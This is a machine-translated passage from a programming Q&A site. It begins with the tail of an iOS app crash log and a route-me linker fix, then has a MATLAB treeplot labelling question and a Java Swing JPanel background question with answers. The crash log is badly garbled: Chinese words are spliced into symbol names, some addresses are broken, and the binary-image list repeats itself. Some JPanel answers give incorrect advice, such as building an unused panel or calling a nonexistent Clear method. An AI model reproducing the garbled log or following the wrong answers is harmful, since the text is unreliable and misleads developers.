> 0x35a88cb9 -[UIControl(Internal) _sendActionsForEvents:withEvent:] + 493 25 UIKit 0x35a895f1 -[UIControl touchesEnded:withEvent:] + 477 26 UIKit
> 0x35a87ad3 -[UIWindow _sendTouchesForEvent:] + 319 27 UIKit
> 0x35a874c1 -[UIWindow sendEvent:] + 381 28 UIKit
> 0x35a6d83d -[UIApplication sendEvent:] + 357 29 UIKit
> 0x35a6d0e3 _UIApplicationHandleEvent + 5827 30个GraphicsServices
> 0x3332522b PurpleEventCallback + 883 31的CoreFoundation
> 0x33e24523 **CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION** + 39 32的CoreFoundation 0x33e244c5 __CFRunLoopDoSource1 + 141 33的CoreFoundation 0x33e23313 __CFRunLoopRun + 1371 34的CoreFoundation
> 0x33da64a5 CFRunLoopRunSpecific + 301 35的CoreFoundation
> 0x33da636d CFRunLoopRunInMode + 105个36 GraphicsServices
> 0x33324439 GSEventRunModal + 137 37的UIKit
> 0x35a9be7d UIApplicationMain + 1081 38
> 货车 0x00027c9f 0x26000 + 7327 39
> 货车 0x00027c80 0x26000 + 7296
> 
> 线程 0 名称：调度队列：com.apple.main-thread 线程 0 崩溃：0 libsystem_kernel.dylib 0x370ec32c __pthread_kill + 8 1 libsystem_c.dylib 0x33252208 pthread_kill + 48 2 libsystem_c.dylib 0x3324b298 abort + 88 3
> libc++abi.dylib 0x30 abort_message + 40 4
> libc ++ abi.dylib 0x30941346 _zl17default_termintv + 18 5 libobjc.a.dylib 0x32942350 _objc_terminate + 140 6 libc ++ abi.dylib 0x309413be _zl19safe_handler_callerpfvve + 70 7 libc ++ abi.dylib 0x3094144a std :: termine（）+ 14 8 libc++abi.dylib
> 0x3094281e __cxa_rethrow + 82 9 libobjc.A.dylib
> 0x329422a2 objc_exception_rethrow + 6 10 CoreFoundation
> 0x33da6506 cfrunlooprunpecific + 398 11
> Corefoundation 0x33da6366 Cfrunloopruninmode + 98 12图形
> 服务0x33324432 Gseventrunmodal + 130 13
> uikit 0x35a9be76 Uiapplicationmain + 1074 14
> wagoner 0x2027c98 0x26000 + 7320 15
> wagoner 0x00027c78 0x26000 + 7288
> 
> 线程 1 名称：调度队列：com.apple.libdispatch-manager 线程 1：0 libsystem_kernel.dylib 0x370dc3a8 kevent + 24 1
> libdispatch.dylib 0x324a0f04 _dispatch_mgr_invoke + 708 2 libdispatch.dylib 0x324a0c22 _dispatch_mgr_thread + 30
> 
> 线程2名：WebThread线程2：0 libsystem_kernel.dylib
> 0x370dc004 mach_msg_trap + 20 1 libsystem_kernel.dylib
> 0x370dc1fa mach_msg + 50 2的CoreFoundation
> 0x33e243ec __CFRunLoopServiceMachPort + 120 3的CoreFoundation
> 0x33e23124 __CFRunLoopRun + 876 4的CoreFoundation
> 0x33da649e CFRunLoopRunSpecific + 294 5的CoreFoundation
> 0x33da6366 CFRunLoopRunInMode + 98 6的WebCore
> 0x376180f0 _ZL12RunWebThreadPv + 396 7 libsystem_c.dylib
> 0x3321372e _pthread_start + 314 8 libsystem_c.dylib
> 0x332135e8 thread_start + 0
> 
> 线程 3：0 libsystem_kernel.dylib 0x370eccd4 __workq_kernreturn + 8 1 libsystem_c.dylib 0x3320df36 _pthread_wqthread + 610 2 libsystem_c.dylib 0x3320dcc8 start_wqthread + 0
> 
> 线程 4：0 libsystem_kernel.dylib 0x370eccd4 __workq_kernreturn + 8 1 libsystem_c.dylib 0x3320df36 _pthread_wqthread + 610 2 libsystem_c.dylib 0x3320dcc8 start_wqthread + 0
> 
> 螺纹5名：调度队列：com.apple.locationd.registration.xpcq螺纹5：0 libsystem_kernel.dylib 0x370dc06c semaphore_timedwait_trap + 8 1 libdispatch.dylib
> 0x324a1182 _dispatch_semaphore_wait_slow + 122 2 libdispatch.dylib 0x324a11f4 dispatch_semaphore_wait $ $ VARIANT MP + 32 3 CoreLocation
> 0x33351db0 CLClientInvokeCallback( **CLClient*, CLClientEvent, __CFDictionary const*) + 340 4 CoreLocation 0x33354530 ___CLClientCreateConnection_block_invoke_0 + 320 5
> CoreLocation 0x33387eea __setDefaultMessageHandler_onQueue_block_invoke_0 + 46 6 CoreLocation 0x333856ca * CLConnection::::
> CoreLocation 0x333864d8 __setEventHandler_block_invoke_0 + 360 8 libxpc.dylib 0x338b58c2 __XPC_CONNECTION_EVENT_HANDLER_CALLOUT** + 30 9
> libxpc.dylib 0x338aed5c _xpc_connection_recv_message + 500 10 libxpc.dylib 0x338aeb18 _xpc_connection_wakeup_recv + 160 11 libxpc.dylib 0x338ae9b8 _xpc_connection_wakeup2 + 1264 12 libxpc.dylib
> 0x338ae3f6 _xpc_connection_wakeup + 62 13 libdispatch.dylib
> 0x324a22da _dispatch_source_invoke + 510 14 libdispatch.dylib
> 0x3249fb7a _dispatch_queue_invoke $ $ VARIANT熔点+ 46 15 libdispatch.dylib 0x3249fc9e _dispatch_queue_drain + 162 16 libdispatch.dylib 0x3249fb6e _dispatch_queue_invoke $ $ VARIANT熔点+ 34 17 libdispatch.dylib 0x3249fc9e _dispatch_queue_drain + 162 18 libdispatch.dylib
> 0x3249fb6e _dispatch_queue_invoke $ $ VARIANT熔点+ 34 19 libdispatch名为.dylib 0x3249fc9e _dispatch_queue_drain + 162 20 libdispatch.dylib 0x3249fb6e _dispatch_queue_invoke $ $ VARIANT熔点+ 34 21 libdispatch.dylib 0x324a07e0 _dispatch_worker_thread2 + 204 22 libsystem_c.dylib
> 0x3320ddf4 _pthread_wqthread + 288 23 libsystem_c.dylib
> 0x3320dcc8 start_wqthread + 0
> 
> 螺纹6名：com.apple.NSURLConnectionLoader螺纹6：0
> libsystem_kernel.dylib 0x370dc004 mach_msg_trap + 20 1
> 个libsystem_kernel.dylib 0x370dc1fa mach_msg + 50 2
> 的CoreFoundation 0x33e243ec **CFRunLoopServiceMachPort + 120 3的CoreFoundation 0x33e23124 __CFRunLoopRun + 876 4的CoreFoundation 0x33da649e CFRunLoopRunSpecific + 294 5的CoreFoundation 0x33da6366 CFRunLoopRunInMode + 98 6 基础 0x32d3dbb2 +[NSURLConnection(Loader) _resourceLoadLoop:] + 302 7 基础 0x32d3da7a -[NSThread main] + 66 8 基础
> 0x32dd158a _ *NSThread* _main** + 1042 9 libsystem_c.dylib
> 0x3321372e _pthread_start + 314 10 libsystem_c.dylib
> 0x332135e8 thread_start + 0
> 
> 螺纹0用臂线坠毁lr：0x3325220f pc：0x370ec32c cpsr：0x000f0010
> 
> 二进制图像：0x26000 - 0x9afff +瓦格纳ARMv7的<685c2b1700e8372e9c25bfde5c69628e> /var/mobile/Applications/AF402A1F-F483-4517-9482-177C928D3859/Waggoner.app/Waggoner 0x2fe25000 - 0x2fe46fff dyld的ARMv7的<4a817f3e0def30d5ae2032157d889c1d> / usr / lib中/ dyld的0x306b4000 - 0x306c0fff corevideo的ARMv7的<364fa32d513f3c11b50970120545f1a8> /System/Library/Frameworks/CoreVideo.framework/CoreVideo 0x30817000 - 0x3085cfff地理服务的ARMv7 /System/Library/PrivateFrameworks/GeoServices.framework/GeoServices 0x3086b000 - 0x3093bfff WebKit的ARMv7的<6ff2796c2f933050ac6ecdee9fc6a216> /系统/库/ PrivateFrameworks / WebKit.framework/WebKit 0x3093c000 - 0x3093cfff vecLib armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/vecLib 0x3093d000 - 0x30944fff libc++abi。dylib的ARMv7 /usr/lib/libc++abi.dylib 0x30961000 - 0x30967fff liblockdown.dylib ARMv7的<9e45ce468a6f31e5b8263f2c224aa800> /usr/lib/liblockdown.dylib 0x30968000 - 0x3097bfff DataDetectorsCore ARMv7的<3f4596cbe1b13fdcb427d87de21df3f6> /System/Library/PrivateFrameworks/DataDetectorsCore.framework/ DataDetectorsCore 0x3097c000 - 0x30adbfff libmecabra.dylib ARMv7的<06a0a1ee488030169bdfab11fc8d2c5c> /usr/lib/libmecabra.dylib 0x30b8a000 - 0x30b8efff libAccessibility.dylib ARMv7的<9a17d07b5a3b38cfafdf16f78c99b572> /usr/lib/libAccessibility.dylib 0x30c5d000 - 0x30c73fff libmis.dylib ARMv7的<258bc92be5823b239b4412dd42cb4807>的/ usr / lib/libmis.dylib 0x30c74000 - 0x30d1efff libBLAS.dylib armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libBLAS。dylib 0x30d8d000 - 0x30d8efff CoreSurface ARMv7的<7850befd26b630f183ee326aaadd7b34> /System/Library/PrivateFrameworks/CoreSurface.framework/CoreSurface 0x30d8f000 - 0x30da1fff DataDetectorsUI ARMv7的<50ea319aaeb7307e92719980dd4b2953> /System/Library/PrivateFrameworks/DataDetectorsUI.framework/DataDetectorsUI 0x30da3000 - 0x30de7fff MobileCoreServices ARMv7的<757226927a873d5492be721908077b48> /系统/图书馆/框架/ MobileCoreServices.framework / MobileCoreServices 0x30e1f000 - 0x30e3cfff libsystem_info.dylib ARMv7的<50863bcbf478323e96a8e5b1a83ea6f9> /usr/lib/system/libsystem_info.dylib 0x30f23000 - 0x30f2ffff libz.1.dylib ARMv7的<36ce86a3dc8c344596c8c325615f374b> / usr / lib中/ libz进行。 1.dylib 0x313bf000 - 0x313cefff SpringBoardServices ARMv7的/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices 0x314f5000 - 0x314f6fff libdyld.dylib ARMv7的<977b0ad6f2f433108b4a0324a57cd2ab> /usr/lib/system/libdyld.dylib 0x31500000 - 0x31523fff的BOM的ARMv7 /系统/库/ PrivateFrameworks / Bom.framework /汜0x31621000 - 0x31645fff PrintKit ARMv7的<08509c7bc915358b953de6f5cbef5c56> /System/Library/PrivateFrameworks/PrintKit.framework/PrintKit 0x3164b000 - 0x31689fff由于IOKit ARMv7的/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit 0x3168c000 - 0x316b1fff的OpenCL armv7 /System/Library/PrivateFrameworks/OpenCL.framework/OpenCL 0x31b5d000 - 0x31baefff CoreText armv7 <5bfac4ee88d03d5b87a1f105abb7756c> /System/Library/Frameworks/CoreText。框架/ CoreText 0x31baf000 - 0x31bbafff AccountSettings ARMv7的<373e59421d983c93931cfbad87b1ae35> /System/Library/PrivateFrameworks/AccountSettings.framework/AccountSettings 0x31bf9000 - 0x31bfdfff IOSurface ARMv7的<6ae77a40f8e93f28bc466ca93f5675d4> /System/Library/PrivateFrameworks/IOSurface.framework/IOSurface 0x31c4b000 - 0x31c5ffff PersistentConnection ARMv7的<65682d21486836a3aa3e17b9461e7b3a > /System/Library/PrivateFrameworks/PersistentConnection.framework/PersistentConnection 0x31c60000 - 0x31cb8fff CoreAudio armv7 /System/Library/Frameworks/CoreAudio.framework/CoreAudio 0x31d0e000 - 0x31d56fff CoreMedia armv7 /System/Library/Frameworks/CoreMedia.framework/CoreMedia 0x31-fc29d JavaScriptCore armv7 <2ffc6c87b94434288366bd53765ee267>/System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore 0x31fc3000 - 0x31ff8fff SystemConfiguration ARMv7的<4464a4e3bb3f32f7abaa35ebf31fda49> /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration 0x31ffe000 - 0x32041fff libcommonCrypto.dylib ARMv7的<95b49daf4cf038b6bea8010bba3a1e26> / usr / lib中/系统/ libcommonCrypto名为.dylib 0x32042000 - 0x32044fff MobileInstallation ARMv7的<215d93dbb0f63cbf828f9126eb7b5349> /System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation 0x32081000 - 0x320c1fff libGLImage.dylib ARMv7的<40448706190031f6b0d9636cc11ee81d> /System/Library/Frameworks/OpenGLES.framework/libGLImage.dylib 0x320c2000 - 0x321b0fff libiconv的.2.dylib armv7 <2cfefe2ad1d335dd9549562910e7a2e2> /usr/lib/libiconv.2。dylib 0x321b1000 - 0x321ecfff libCGFreetype.A.dylib ARMv7的<55941c96cf1f3b048e72a148c4496c16> /System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib 0x321ed000 - 0x321f9fff libCRFSuite.dylib ARMv7的/usr/lib/libCRFSuite.dylib 0x32243000 - 0x32258fff libresolv库.9.dylib ARMv7的<66f7557fa4b43979b186e00271839fdb> /usr/lib/libresolv.9.dylib 0x3249d000 - 0x324b3fff libdispatch.dylib ARMv7的<9ecfaef4110a3bf9a92d12f0fe8d1d78> /usr/lib/system/libdispatch.dylib 0x32646000 - 0x32647fff DataMigration的ARMv7 /系统/库/ PrivateFrameworks / DataMigration.framework/DataMigration 0x32648000 - 0x3267ffff 安全 armv7 /System/Library/Frameworks/Security.framework/Security 0x326e0000 - 0x326e6fff MobileKeyBag armv7 /System/Library/PrivateFrameworks/MobileKeyBag。框架/ MobileKeyBag 0x32740000 - 0x32742fff libCoreVMClient.dylib ARMv7的/System/Library/Frameworks/OpenGLES.framework/libCoreVMClient.dylib 0x32743000 - 0x32743fff加速的ARMv7 <55b24cf91a8b3532bde6733c96f14c08> /System/Library/Frameworks/Accelerate.framework/Accelerate 0x32744000 - 0x32835fff QuartzCore的ARMv7 / System/Library/Frameworks/QuartzCore.framework/QuartzCore 0x328e4000 - 0x328eafff liblaunch.dylib armv7 /usr/lib/system/liblaunch.dylib 0x32939000 - 0x329fffff libobjc.A.dylib armv7 <90014d1bc583366d856622e43097df.4 0x32c61000 - 0x32c61fff libCVMSPluginSupport.dylib armv7 /System/Library/Frameworks/OpenGLES.framework/libCVMSPluginSupport.dylib 0x32c62000 - 0x32cdbfff ProofReader armv7 <6db611d8df6530d480f97a40bc519f70>/System/Library/PrivateFrameworks/ProofReader.framework/ProofReader 0x32d2d000 - 0x32eabfff基金会的ARMv7 /System/Library/Frameworks/Foundation.framework/Foundation 0x3301e000 - 0x33021fff NetworkStatistics ARMv7的<7848d8ebad99367cb4f7f4e3fe88e5d6> /System/Library/PrivateFrameworks/NetworkStatistics.framework/NetworkStatistics 0x33022000 - 0x33023fff libsystem_blocks.dylib ARMv7的<9fdc27af7350323bbc7d98e14e027907> /usr/lib/system/libsystem_blocks.dylib 0x33025000 - 0x3305dfff VideoToolbox ARMv7的<9f25f38d1cd13a1daff99cfde8884410> /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox 0x330a4000 - 0x330eefff ManagedConfiguration ARMv7的<5e0a131bbfec305ea01f9e01f486da63> /系统/库/PrivateFrameworks/ManagedConfiguration。框架/ ManagedConfiguration 0x330ef000 - 0x330f3fff libGFXShared.dylib ARMv7的<998fccc16cf735dbb62324202995e193> /System/Library/Frameworks/OpenGLES.framework/libGFXShared.dylib 0x33140000 - 0x33143fff libmacho.dylib ARMv7的/usr/lib/system/libmacho.dylib 0x331d7000 - 0x331e4fff libbsm.0 .dylib armv7 <750a0de73a733019a77144b805d4d2f8> /usr/lib/libbsm.0.dylib 0x33205000 - 0x33291fff libsystem_c.dylib armv7 /usr/lib/system/libsystem_c.dylib 0x33297000 - 0x33297000 - 0x3329afff/libbsm.0.dylib armvrt.dylib/usr/system_rt. 0x3329b000 - 0x332b4fff libRIP.A.dylib armv7 <1828cddc5dd93c61afbefb59587d7f8a> /System/Library/Frameworks/CoreGraphics.framework/Resources/libRIP.A.dylib 0x332c0000 - 0x3330cfff CoreTelephony armv7 /System/Telephony/Frameworks框架/ CoreTelephony 0x33320000 - 0x3332afff GraphicsServices ARMv7的/System/Library/PrivateFrameworks/GraphicsServices.framework/GraphicsServices 0x3332b000 - 0x33330fff libsystem_dnssd.dylib ARMv7的<27bb5462450732e380f5a2c170546e93> /usr/lib/system/libsystem_dnssd.dylib 0x33331000 - 0x33340fff GenerationalStorage的ARMv7 /系统/库/ PrivateFrameworks / GenerationalStorage.framework / GenerationalStorage 0x3334f000 - 0x3339dfff CoreLocation ARMv7的<44550ebedf23334d85441d9743b74e03> /System/Library/Frameworks/CoreLocation.framework/CoreLocation 0x333b7000 - 0x33496fff RawCamera ARMv7的<98fb7b5042b2314b86f4be8d2881bd04> /System/Library/CoreServices/RawCamera.bundle/RawCamera 0x334a1000 - 0x334e0fff快速查看 armv7 <802b1092542a3017a0380632502610d4>/System/Library/Frameworks/QuickLook.framework/QuickLook 0x33759000 - 0x3375dfff AggregateDictionary ARMv7的<3a3a33f3a05538988c6e2bb363dc46a8> /System/Library/PrivateFrameworks/AggregateDictionary.framework/AggregateDictionary 0x33762000 - 0x33782fff libxslt.1.dylib ARMv7的<39348471007e39dab80af68b08390456> / usr / lib中/的libxslt .1.dylib 0x338ad000 - 0x338befff libxpc.dylib ARMv7的/usr/lib/system/libxpc.dylib 0x338bf000 - 0x338c6fff AssetsLibraryServices ARMv7的<0703f561f9a038b6850d6e93bba7e5f4> /System/Library/PrivateFrameworks/AssetsLibraryServices.framework/AssetsLibraryServices 0x3399f000 - 0x33a1efff libsqlite3.dylib的ARMv7 / USR /lib/libsqlite3.dylib 0x33a4a000 - 0x33a50fff libnotify.dylib armv7 <9406297de3e43742887890662a87ab53> /usr/lib/system/libnotify.dylib 0x33b72000 - 0x33b88fff DictionaryServices ARMv7的<6ed2e967136f37d4a4b9b318d6c43b83> /System/Library/PrivateFrameworks/DictionaryServices.framework/DictionaryServices 0x33b89000 - 0x33b89fff liblangid.dylib ARMv7的<644ff4bcfbf337b5b5859e3f0fc0a9a8> /usr/lib/liblangid.dylib 0x33b91000 - 0x33bcdfff AppSupport ARMv7的<311eac85b2a433a884dacba77217b49e> /系统/库/ PrivateFrameworks / AppSupport.framework / AppSupport 0x33d90000 - 0x33d93fff CaptiveNetwork ARMv7的/System/Library/PrivateFrameworks/CaptiveNetwork.framework/CaptiveNetwork 0x33d97000 - 0x33eaefff的CoreFoundation ARMv7的<6d450fe923d7387f8b01845e0edd713d> /System/Library/Frameworks/CoreFoundation.framework/CoreFoundation 0x33ebf000 - 0x33ec0fff libremovefile .dylib armv7 <402f8956975d3b6fb86ab9b31a43242c>/usr/lib/system/libremovefile.dylib 0x33fa1000 - 0x34262fff libLAPACK.dylib ARMv7的<0e94e9a7e7a334649afaccae0f1215a2> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libLAPACK.dylib 0x3427a000 - 0x3427efff IOMobileFramebuffer ARMv7的<42dbc26828e934acabb4f3b0a35d8250> /系统/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer 0x3427f000 - 0x34289fff libvMisc.dylib armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libvMisc.dylib 0x3428a000 - 0x3428afff libunwind.dylib armv7 /usr/lib/system /libunwind.dylib 0x3428b000 - 0x342aafff libSystem.B.dylib armv7 <0c55744b6f7335eebba4ca2c3d10b43c> /usr/lib/libSystem.B.dylib 0x342c1000 - 0x34398fff CFNetwork armv7 <765a472c8248130ee7a/System/Library/Frameworks/CFNetwork.framework/CFNetwork 0x343ea000 - 0x343f4fff libbz2.1.0.dylib armv7 <40e4045fb79e382b8833707746cf28b1> /usr/lib/libbz2.1.0.dylib 0x343ea000 - 0x343ea000 - 0x344dv7 /usrlib/libst.dylib armv7 6.dylib 0x34a6e000 - 0x34a6ffff libsystem_sandbox.dylib ARMv7的<66e985f3eea03ef08afb7cf4c153f76e> /usr/lib/system/libsystem_sandbox.dylib 0x34a70000 - 0x34a74fff libcache.dylib ARMv7的/usr/lib/system/libcache.dylib 0x34b0b000 - 0x34b7bfff CoreImage ARMv7的<86ac6f5a267637b6b7f8a831dfc7c64b> /系统/Library/Frameworks/CoreImage.framework/CoreImage 0x34cee000 - 0x34e94fff CoreData armv7 /System/Library/Frameworks/CoreData.framework/CoreData 0x3508a000 - 0x350d3fff AddressBook armv7 /System/Library/Frameworks/AddressBook。框架/通讯录0x351ed000 - 0x351f6fff libMobileGestalt.dylib ARMv7的<4a15e845dc6f3a4a980de66c1cc44c42> /usr/lib/libMobileGestalt.dylib 0x35238000 - 0x352e5fff libxml2.2.dylib ARMv7的<58d47f064e0232119f4b838ad659f9c1> /usr/lib/libxml2.2.dylib 0x35439000 - 0x3543ffff MobileIcons的ARMv7 /系统/Library/PrivateFrameworks/MobileIcons.framework/MobileIcons 0x35a20000 - 0x35a69fff的libc ++ 1.dylib ARMv7的<5b690e5dd5a43a7fb166ade9fe58a7a4> /usr/lib/libc++.1.dylib 0x35a6a000 - 0x35f0cfff UIKit中的ARMv7 /System/Library/Frameworks/UIKit.framework/UIKit 0x35f39000 - 0x35f41fff ProtocolBuffer armv7 <0e846afacf823d2b8c029cc3010a8253> /System/Library/PrivateFrameworks/ProtocolBuffer.framework/ProtocolBuffer 0x35f94000 - 0x35f94fff libkeymgr.dylib armv7 /usr/lib/system/libkeymgr.dylib 0x35f95000 - 0x360dafff CoreGraphics中的ARMv7 <903545b89a7f311d95100ac7d1d44709> /System/Library/Frameworks/CoreGraphics.framework/CoreGraphics 0x362a4000 - 0x362b3fff OpenGLES ARMv7的/System/Library/Frameworks/OpenGLES.framework/OpenGLES 0x36398000 - 0x368dcfff FaceCoreLight的ARMv7 /系统/库/ PrivateFrameworks / FaceCoreLight.framework / FaceCoreLight 0x368e4000 - 0x36ac8fff AudioToolbox ARMv7的/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox 0x36c43000 - 0x36fb2fff的TextInput ARMv7的<8d7f24642c7634cc8e3a6e65f1dcd98e> /System/Library/PrivateFrameworks/TextInput.framework/TextInput 0x36fb3000 - 0x36fb3fff libgcc_s.1.dylib armv7 /usr/lib/libgcc_s.1.dylib 0x36fb4000 - 0x36fc5fff DataAccessExpress armv7 /System/Library/PrivateFrameworks/DataAccessExpress。框架/ DataAccessExpress 0x36fd2000 - 0x36fd5fff libsystem_network.dylib ARMv7的<356cb66612e836968ef24e6e5c3364cc> /usr/lib/system/libsystem_network.dylib 0x36fd6000 - 0x37020fff libvDSP.dylib ARMv7的<441b42aca07b3da39feab25f8349918f> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/ libvDSP.dylib 0x37021000 - 0x37029fff MobileWiFi ARMv7的/System/Library/PrivateFrameworks/MobileWiFi.framework/MobileWiFi 0x37043000 - 0x37048fff libcopyfile.dylib ARMv7的<52e874396c393ed29099789ce702cfe2> /usr/lib/system/libcopyfile.dylib 0x370db000 - 0x370f1fff libsystem_kernel.dylib ARMv7的<7ac5560851ce3cb3981068092074b409> /usr/lib/system/libsystem_kernel.dylib 0x370f2000 - 0x372affff ImageIO armv7 <02e3578171fa3b6a969b244275fd2bab> /System/Library/Frameworks/ImageIO.框架/ ImageIO的0x3731a000 - 0x3731bfff libdnsinfo.dylib ARMv7的<9aede8d6579d3430ac39ae5f95cce498> /usr/lib/system/libdnsinfo.dylib 0x373a4000 - 0x373bafff EAP8021X ARMv7的/System/Library/PrivateFrameworks/EAP8021X.framework/EAP8021X 0x373bb000 - 0x37504fff libicucore.A.dylib的ARMv7 / usr / lib中/ libicucore.A.dylib 0x3756f000 - 0x37d2dfff WebCore的ARMv7的<814351ff217e3425a8e532c2e2251f73> /System/Library/PrivateFrameworks/WebCore.framework/WebCore 0x37eac000 - 0x37eaffff CoreTime ARMv7的/System/Library/PrivateFrameworks/CoreTime.framework/CoreTime 0x38178000 - 0x38250fff VIMAGE armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework/vImagedylib 0x373a4000 - 0x373bafff EAP8021X ARMv7的/System/Library/PrivateFrameworks/EAP8021X.framework/EAP8021X 0x373bb000 - 0x37504fff libicucore.A.dylib ARMv7的/usr/lib/libicucore.A.dylib 0x3756f000 - 0x37d2dfff WebCore的ARMv7的<814351ff217e3425a8e532c2e2251f73> /系统/库/ PrivateFrameworks/WebCore.framework/WebCore 0x37eac000 - 0x37eaffff CoreTime armv7 /System/Library/PrivateFrameworks/CoreTime.framework/CoreTime 0x38178000 - 0x38250fff vImage armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework/vImagedylib 0x373a4000 - 0x373bafff EAP8021X ARMv7的/System/Library/PrivateFrameworks/EAP8021X.framework/EAP8021X 0x373bb000 - 0x37504fff libicucore.A.dylib ARMv7的/usr/lib/libicucore.A.dylib 0x3756f000 - 0x37d2dfff WebCore的ARMv7的<814351ff217e3425a8e532c2e2251f73> /系统/库/ PrivateFrameworks/WebCore.framework/WebCore 0x37eac000 - 0x37eaffff CoreTime armv7 /System/Library/PrivateFrameworks/CoreTime.framework/CoreTime 0x38178000 - 0x38250fff vImage armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework/vImage/System/Library/PrivateFrameworks/WebCore.framework/WebCore 0x37eac000 - 0x37eaffff CoreTime armv7 /System/Library/PrivateFrameworks/CoreTime.framework/CoreTime 0x38178000 - 0x38250fff vImage armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework /vImage/System/Library/PrivateFrameworks/WebCore.framework/WebCore 0x37eac000 - 0x37eaffff CoreTime armv7 /System/Library/PrivateFrameworks/CoreTime.framework/CoreTime 0x38178000 - 0x38250fff vImage armv7 /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework /vImage

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T14:03:31.943

这是一个相当常见的路由问题；我只是再次碰到它，像你一样浪费了更多的时间。

您需要添加这段代码。我把它放在包含 MapView 的视图控制器中的 initWithNibName 中。

```
 //let the linker know that you access RMMapView
    [RMMapView class]; 
```

关键似乎是，如果您使用 IB 创建地图视图，链接器不知道您需要大部分 route-me 代码，并且对于发布版本，它认为未使用的代码会被积极地从链接库中删除.

[http://groups.google.com/group/route-me-map/browse_thread/thread/ad841852d30d2732/75e9af55134e6978?lnk=gst&q=doesNotRecognizeSelector#75e9af55134e6978](http://groups.google.com/group/route-me-map/browse_thread/thread/ad841852d30d2732/75e9af55134e6978?lnk=gst&q=doesNotRecognizeSelector#75e9af55134e6978)

# matlab - TreePlot 字符串标签 MATLAB

> ID：10148419
> 
> 赞同：1
> 
> 时间：2012-04-13T21:15:48.667
> 
> 标签：matlab

节点 = [0 1 2 3 4 4 3 7 7 2 10 11 11 10 14 14 1 17 18 19 19 18 22 22 17 25 26 26 25 29 29]；这是深度 4 树的标准图。它在一个循环中，并被绘制 10 次。现在，这 10 次中的每一次都完成了一些数值计算，并得出了不同的数字。这些数字都指向主数组中的一些单词标签。每次这些数字改变时，索引的单词也会改变，我已经知道如何将它们放置在树中。那么如何用这些字符串标记树呢？

我想，一般的问题是如何用一堆字符串标记一棵树？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T01:47:47.850

有点技巧是查看绘制的点，假设它们与向量中的节点有 1-1 对应关系，使用它们的坐标来绘制文本。

```
treeplot([0 1 1]);  % plot your tree
c = get(gca, 'Children'); % get handles to children
% grab X and Y coords from the second child (the first one is axes)
x = get(c(2), 'XData');
y = get(c(2), 'YData'); 
```

现在您可以在这些坐标处绘制任何内容。如果`labels`是标签元胞数组，则可以在节点旁边显示它们，如下所示：

```
text(x, y, labels, 'VerticalAlignment','bottom', ...
                         'HorizontalAlignment','right') 
```

# java - JPanel setBackground(Color.BLACK) 什么都不做

> ID：10148421
> 
> 赞同：12
> 
> 时间：2012-04-13T21:15:53.700
> 
> 标签：java, swing, background, jpanel, setbackground

我有以下自定义 JPanel，我已经使用 Netbeans GUI 构建器将它添加到我的框架中，但背景不会改变！我可以看到圆圈，用 g.fillOval() 绘制。怎么了？

```
public class Board extends JPanel{

    private Player player;

    public Board(){
        setOpaque(false);
        setBackground(Color.BLACK);  
    }

    public void paintComponent(Graphics g){  
        super.paintComponent(g);
        g.setColor(Color.red);
        g.fillOval(player.getxCenter(), player.getyCenter(), player.getRadius(), player.getRadius());
    }

    public void updatePlayer(Player player){
        this.player=player;
    }
} 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-14T00:28:34.537

如果您的面板“不透明”（透明），您将看不到背景颜色。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-04-13T21:16:42.990

您还必须调用`super.paintComponent();`，以允许 Java API 绘制原始背景。super 指的是原始的 JPanel 代码。

```
public void paintComponent(Graphics g){
    super.paintComponent(g);

    g.setColor(Color.red);
    g.fillOval(player.getxCenter(), player.getyCenter(), player.getRadius(), player.getRadius());
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-09-02T22:23:47.470

您需要在 Board 构造函数中创建一个新的 Jpanel 对象。例如

```
public Board(){
    JPanel pane = new JPanel();
    pane.setBackground(Color.ORANGE);// sets the background to orange
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-09-09T18:09:44.270

```
setOpaque(false); 
```

**变成**

```
setOpaque(true); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-04-14T00:45:21.880

我刚刚尝试了一个简单的实现，它就可以工作：

```
public class Test {

    public static void main(String[] args) {
            JFrame frame = new JFrame("Hello");
            frame.setPreferredSize(new Dimension(200, 200));
            frame.add(new Board());
            frame.pack();
            frame.setVisible(true);
    }
}

public class Board extends JPanel {

    private Player player = new Player();

    public Board(){
        setBackground(Color.BLACK);
    }

    public void paintComponent(Graphics g){  
        super.paintComponent(g);
        g.setColor(Color.red);
        g.fillOval(player.getCenter().x, player.getCenter().y,
             player.getRadius(), player.getRadius());
    } 
}

public class Player {

    private Point center = new Point(50, 50);

    public Point getCenter() {
        return center;
    }

    private int radius = 10;

    public int getRadius() {
        return radius;
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-02-28T17:24:53.533

为了将背景完全设置为给定的颜色：

1）首先设置背景颜色

2）调用方法“Clear(0,0,this.getWidth(),this.getHeight())”（组件绘制区域的宽度和高度）

我认为这是设置背景的基本程序......我遇到了同样的问题。

